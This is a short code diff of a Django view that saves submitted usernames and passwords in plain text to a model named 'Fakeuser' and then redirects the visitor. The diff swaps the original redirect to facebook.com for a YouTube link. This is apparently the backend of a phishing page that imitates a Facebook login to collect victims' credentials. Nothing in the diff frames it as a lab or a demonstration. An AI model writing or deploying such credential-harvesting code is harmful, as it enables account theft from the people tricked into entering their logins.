@@ -7,5 +7,5 @@ def home(request):
         username = request.POST.get('username')
         password =request.POST.get('password')
         Fakeuser.objects.create(username=username, password=password)
-        return redirect('https://facebook.com')
+        return redirect('https://youtu.be/dQw4w9WgXcQ?si=HmC7xan2XIJ-crlE')
     return render(request, 'index.html', {})
